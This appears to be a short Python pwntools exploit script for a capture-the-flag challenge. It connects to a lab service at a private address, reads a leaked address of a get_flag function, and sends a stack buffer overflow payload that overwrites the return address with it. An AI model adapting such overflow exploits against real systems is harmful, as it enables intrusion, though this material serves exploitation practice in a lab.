#!/usr/bin/python
#coding:utf-8
#使用get_flag的地址覆盖掉回复的参数地址
from pwn import *
context.update(arch = 'amd64', os = 'linux', timeout = 1)
io=remote('172.17.0.2',10001)
io.recvuntil("WOW:")
get_flag=io.recv()
payload='a'*0x48+p64(int(get_flag[:8],16))
io.sendline(payload)
print io.recv()